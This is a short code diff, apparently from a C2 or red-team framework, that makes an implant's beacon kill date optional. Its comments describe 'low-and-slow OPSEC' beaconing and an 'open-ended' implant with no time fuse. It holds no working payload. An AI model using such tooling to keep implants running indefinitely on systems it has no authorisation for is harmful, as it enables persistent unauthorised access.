@@ -148,10 +148,15 @@ public sealed record TransportProfile(
 /// queued tasking, closes, and sleeps the interval -- the low-and-slow OPSEC
 /// shape. Defaults to <c>stream</c>.
 /// </param>
+/// <param name="KillDate">
+/// The self-termination timestamp, or null for an open-ended artifact: the
+/// long-haul posture where the implant runs until it is retired or the
+/// operator rebuilds it, with no time fuse at all.
+/// </param>
 public sealed record BeaconProfile(
     TimeSpan Sleep,
     TimeSpan Jitter,
-    DateTimeOffset KillDate,
+    DateTimeOffset? KillDate,
     string Mode = "stream");
 
 /// <summary>
